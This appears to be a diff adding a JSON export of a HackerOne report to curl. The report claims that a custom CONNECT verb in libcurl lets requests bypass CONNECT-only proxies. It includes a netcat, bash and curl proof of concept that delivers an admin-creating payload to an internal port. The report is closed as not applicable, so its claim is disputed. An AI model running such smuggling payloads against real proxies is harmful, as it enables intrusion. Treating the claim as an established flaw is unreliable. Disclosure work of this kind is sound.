@@ -1,0 +1,123 @@
+{
+  "id": 3231321,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMjMxMzIx",
+  "url": "https://hackerone.com/reports/3231321",
+  "title": "HTTP Proxy Bypass via `CURLOPT_CUSTOMREQUEST` Verb Tunneling",
+  "state": "Closed",
+  "substate": "not-applicable",
+  "severity_rating": "high",
+  "readable_substate": "N/A",
+  "created_at": "2025-07-01T12:47:43.690Z",
+  "submitted_at": "2025-07-01T12:47:44.062Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "alphox",
+    "url": "/alphox",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2025-07-01T14:20:30.177Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2025-07-01T14:19:08.779Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "### **Summary**\n\nA logic flaw in `libcurl` version **8.14.1** allows an attacker to bypass restrictive HTTP proxy firewalls by \"tunneling\" an arbitrary HTTP verb within a `CONNECT` request. By setting `CURLOPT_CUSTOMREQUEST` to `CONNECT` for a standard `http://` URL, an attacker can trick `libcurl` into creating a hybrid request. This request is misinterpreted by `CONNECT`-only proxies as a legitimate tunnel setup request and is therefore allowed. Subsequently, `libcurl` sends its request body (e.g., from `CURLOPT_POSTFIELDS`) through this newly established, unfiltered TCP pipe.\n\nThis vulnerability effectively defeats network segmentation rules enforced at the proxy layer, enabling an attacker who can control `curl` options (e.g., via SSRF) to send arbitrary data to protected internal services.\n\n| | |\n| - | - |\n| **Product Name** | libcurl |\n| **Affected Version** | **8.14.1** (and likely prior versions) |\n| **Vulnerability Class** | CWE-284 Improper access control |\n| **CVSS 3.1 Score** | **8.6 (High)** |\n| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:H/A:N` |\n\n### **Description**\n\nThe vulnerability stems from insufficient validation between the user-defined request method and the request type `libcurl` assumes it is making when a proxy is in use.\n\n1.  When a user provides an `http://` URL and a proxy, `libcurl` prepares a standard, non-tunneled proxy request (e.g., `GET http://destination/... HTTP/1.1`).\n2.  If the user also sets `CURLOPT_CUSTOMREQUEST` to `\"CONNECT internal.host:port HTTP/1.1\"`, this custom verb overrides the standard `GET`.\n3.  The request line sent to the proxy now begins with `CONNECT`, which satisfies the security rules of a proxy that only permits the `CONNECT` method for establishing tunnels. The proxy allows the request and opens a raw TCP connection to the specified internal host and port.\n4.  Because the original URL scheme was `http://`, `libcurl`'s state machine does not enter its formal \"HTTPS tunneling\" mode. It proceeds as if it were making a `POST`-style request (due to the presence of a request body) and sends the payload down the TCP pipe that the proxy just opened.\n\nThis allows an attacker to send arbitrary data directly to an internal service that should have been unreachable.\n\n### **Proof-of-Concept (PoC)**\n\nThis PoC demonstrates the bypass using standard command-line tools. It requires three separate terminal sessions.\n\n#### **Step 1: Set up the \"Forbidden\" Internal Server (Terminal 1)**\n\nThis server listens on port 8081. Its purpose is to receive and display the smuggled payload.\n\n```bash\necho \"[VICTIM] Listening on 127.0.0.1:8081...\"\nnc -l -p 8081\n```\n\n#### **Step 2: Set up the Restrictive Proxy (Terminal 2)**\n\nThis proxy listens on port 8080 and only allows requests that start with `CONNECT`. It responds with a `405 Method Not Allowed` for any other verb.\n\n*   Save this script as `restrictive_proxy.sh` and make it executable with `chmod +x restrictive_proxy.sh`.\n\n    ```bash\n    #!/bin/bash\n    read -r request_line\n    echo \"[PROXY] Received: '$request_line'\" >&2\n    if [[ \"$request_line\" == \"CONNECT\"* ]]; then\n        echo \"[PROXY] Verdict: ALLOWED. Opening tunnel.\" >&2\n        destination=$(echo \"$request_line\" | awk '{print $2}')\n        echo -e \"HTTP/1.1 200 Connection established\\r\\n\"\n        # Pipe the rest of the client's input to the destination\n        nc -w 5 $(echo \"$destination\" | sed 's/:/ /')\n    else\n        echo \"[PROXY] Verdict: BLOCKED. Sending 405.\" >&2\n        echo -e \"HTTP/1.1 405 Method Not Allowed\\r\\nContent-Length: 0\\r\\n\\r\\n\"\n    fi\n    ```\n\n*   Run the proxy in a loop to handle multiple connections:\n\n    ```bash\n    while true; do ./restrictive_proxy.sh | nc -l -p 8080; done\n    ```\n\n#### **Step 3: Verify the Safeguard (Terminal 3)**\n\nThis command proves the proxy correctly blocks normal `GET` requests.\n\n```bash\n# This request should fail.\ncurl -v --proxy http://127.0.0.1:8080 \"http://internal-server.local:8081/status\"\n```\n> **Expected Result:** The proxy will respond with `405 Method Not Allowed`, and the `curl` command will fail. The Internal Server will receive no connection.\n\n#### **Step 4: Craft the Attacker's Payload (Terminal 3)**\n\nCreate a file named `payload.txt` containing the data to be smuggled.\n\n```bash\necho -e \"POST /api/v1/users HTTP/1.1\\r\\nHost: internal-server.local\\r\\nContent-Type: application/json\\r\\n\\r\\n{\\\"username\\\":\\\"pwned\\\",\\\"is_admin\\\":true}\" > payload.txt\n```\n\n#### **Step 5: Execute the Bypass Attack (Terminal 3)**\n\nThis command uses the vulnerability to bypass the proxy.\n\n```bash\n# This request should succeed in tricking the proxy.\ncurl -v --proxy http://127.0.0.1:8080 \\\n  --request \"CONNECT 127.0.0.1:8081 HTTP/1.1\" \\\n  --data-binary \"@payload.txt\" \\\n  \"http://ignored-url.com\"\n```\n\n#### **Step 6: Observe the Result**\n\n-   **Proxy (Terminal 2):** Will print `[PROXY] Verdict: ALLOWED...`, showing it was fooled by the `CONNECT` verb.\n-   **Internal Server (Terminal 1):** Will stop waiting and print the contents of `payload.txt`, proving the proxy was bypassed and the malicious payload was delivered to the protected internal resource.\n    > ```\n    > POST /api/v1/users HTTP/1.1\n    > Host: internal-server.local\n    > Content-Type: application/json\n    > \n    > {\"username\":\"pwned\",\"is_admin\":true}\n    > ```\n\n### **Impact**\n\nThe impact of this vulnerability is **High**. It allows an attacker who can control `libcurl`'s options (a common result of a Server-Side Request Forgery vulnerability) to completely bypass network egress filtering rules enforced by `CONNECT`-only proxies. This can lead to:\n\n-   **Internal Network Pivoting:** An attacker can use a public-facing application as a pivot point to send arbitrary commands to internal, non-routable services such as databases, internal APIs, or cloud metadata services.\n-   **Data Exfiltration:** The established tunnel can be used to exfiltrate sensitive data from compromised internal systems.\n-   **Firewall and WAF Bypass:** Application-layer firewalls on the proxy that are designed to inspect `GET` and `POST` requests are rendered ineffective, as the attacker's payload is sent over a raw TCP pipe that the proxy is not configured to inspect.\n\nThis turns a potentially moderate-risk SSRF flaw into a critical internal network access vector, significantly elevating the overall risk to an organization's infrastructure.\n\n### **Suggested Mitigation**\n\nThe logic in `lib/http.c` should be hardened to create a stronger link between the URL's scheme and the allowed HTTP method when a proxy is in use. A recommended fix would be:\n\nIf an `http://` URL is used with a proxy, `libcurl` should explicitly forbid `CURLOPT_CUSTOMREQUEST` from being set to `CONNECT`. The `CONNECT` method should only be used by `libcurl`'s internal tunneling logic when an `https://` URL is being proxied, and it should not be a user-controllable verb for standard `http://` proxy requests. This would close the logical gap that allows this bypass.\n\n## Impact\n\n## Summary:\nThe impact of this vulnerability is **High**. It allows an attacker who can control `libcurl`'s options (a common result of a Server-Side Request Forgery vulnerability) to completely bypass network egress filtering rules enforced by `CONNECT`-only proxies. This can lead to:\n\n-   **Internal Network Pivoting:** An attacker can use a public-facing application as a pivot point to send arbitrary commands to internal, non-routable services such as databases, internal APIs, or cloud metadata services.\n-   **Data Exfiltration:** The established tunnel can be used to exfiltrate sensitive data from compromised internal systems.\n-   **Firewall and WAF Bypass:** Application-layer firewalls on the proxy that are designed to inspect `GET` and `POST` requests are rendered ineffective, as the attacker's payload is sent over a raw TCP pipe that the proxy is not configured to inspect.\n\nThis turns a potentially moderate-risk SSRF flaw into a critical internal network access vector, significantly elevating the overall risk to an organization's infrastructure.",
+  "weakness": {
+    "id": 26,
+    "name": "Improper Access Control - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 21,
+  "voters": [
+    "thalaivar304",
+    "polem4rch",
+    "2026",
+    "al0ke",
+    "us3rn4me1955",
+    "rownok871",
+    "awso0h1ll4",
+    "aintsophie28",
+    "mackgoodman",
+    "jacques8",
+    "and 11 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
